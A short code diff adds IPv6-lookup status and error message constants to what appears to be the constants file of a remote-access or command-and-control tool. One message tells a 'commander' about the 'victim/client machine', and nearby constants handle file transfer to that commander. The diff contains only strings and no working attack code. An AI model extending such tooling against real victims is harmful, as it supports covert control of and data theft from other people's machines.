@@ -104,6 +104,13 @@ CALL_MAP_FUNCTION_ERROR = "[+] TRANSFER FILE ERROR: Invalid operation while call
 SOURCE_ADDRESS_FIELD = "Source Address"
 DESTINATION_ADDRESS_FIELD = "Destination Address"
 FILE_TRANSFER_UNSUCCESSFUL = "[+] FILE TRANSFER UNSUCCESSFUL: Invalid operation was chosen!"
+IPV6 = "IPv6"
+IPV6_FOUND_MSG = "[+] OPERATION SUCCESSFUL: IPV6 has been found: {}"
+IPV6_OPERATION_ERROR = "[+] OPERATION UNSUCCESSFUL: An invalid IPv6 address was returned!"
+IMPORT_IPV6_SCRIPT_ERROR = "{} has failed to be imported at runtime!"
+INVALID_IPV6_ERROR = "[+] INVALID IPV6 ADDRESS: An error has occurred {}"
+IPV6_ERROR_MSG_TO_CMDR = ("An invalid IPv6 address was returned or no IPv6 address can be "
+                          "determined on victim/client machine!")
 
 # Transfer File to Commander
 GET_FILE_SIGNAL = "GET FILE"
